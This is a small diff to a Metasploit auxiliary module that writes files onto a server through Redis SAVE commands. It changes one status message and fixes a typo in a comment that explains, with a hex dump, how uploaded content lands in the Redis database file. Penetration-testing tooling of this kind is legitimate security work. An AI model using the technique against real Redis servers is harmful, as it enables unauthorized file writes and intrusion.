@@ -77,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
     return unless data.include?('+OK')
     data = redis_command('SAVE')
     return unless data.include?('+OK')
-    print_good("#{peer} -- saved file to #{path}")
+    print_good("#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}")
 
     # cleanup
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
     # file such that what we uploaded will be interpretted as if it contained
     # only the contents of what we uploaded.  For example, here is a nearly
     # empty redis database that started with a single key (foo) value (bar)
-    # pair, and the contents of what we uploaded was the current data:
+    # pair, and the contents of what we uploaded was the current date:
     #
     # 00000000  52 45 44 49 53 30 30 30  31 fe 00 00 03 66 6f 6f  |REDIS0001....foo|
     # 00000010  03 62 61 72 00 20 6a 6b  59 47 44 74 56 6a 68 53  |.bar. jkYGDtVjhS|
